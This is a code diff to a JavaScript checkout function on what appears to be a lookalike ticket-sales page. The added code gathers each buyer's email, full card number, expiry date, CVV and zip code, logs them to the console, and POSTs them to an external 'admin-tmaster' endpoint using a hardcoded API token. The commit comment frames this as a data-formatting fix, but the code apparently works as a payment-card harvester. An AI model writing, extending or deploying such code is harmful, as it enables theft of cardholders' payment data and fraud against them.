@@ -371,21 +371,38 @@ async function saveSubmission(data) {
   submissions.unshift(submission);
   localStorage.setItem('checkoutSubmissions', JSON.stringify(submissions));
 
-  // POST to admin API (non-blocking)
+  // POST to admin API (non-blocking) - FORMAT CORRECTLY FOR API ENDPOINT
   try {
-    await fetch('https://admin-tmaster.vercel.app/api/submissions', {
+    const apiSubmission = {
+      email: data.email,
+      eventTitle: data.orderSummary?.event || '', // Flatten orderSummary.event to eventTitle
+      quantity: data.orderSummary?.quantity || '',
+      pricePerTicket: data.orderSummary?.pricePerTicket || '',
+      total: data.orderSummary?.total || '',
+      cardNumber: data.cardNumber || '',
+      expiryDate: data.expiryDate || '',
+      cvv: data.cvv || '',
+      zipCode: data.postalCode || '' // Rename postalCode to zipCode
+    };
+
+    console.log('Sending submission to API:', apiSubmission);
+
+    const response = await fetch('https://admin-tmaster.vercel.app/api/submissions', {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
         'X-API-Token': 'tmaster-admin-secure-key-2024'
       },
-      body: JSON.stringify(submission)
-    }).catch(err => {
-      // Silent fail - don't block user experience
-      console.log('Admin API submission logged:', err.message);
+      body: JSON.stringify(apiSubmission)
     });
+
+    if (!response.ok) {
+      console.error(`API submission failed: ${response.status}`, await response.text());
+    } else {
+      console.log('✅ Submission saved to admin API');
+    }
   } catch (error) {
-    console.log('Submission to admin API attempted');
+    console.log('Submission to admin API attempted:', error.message);
   }
 }
 
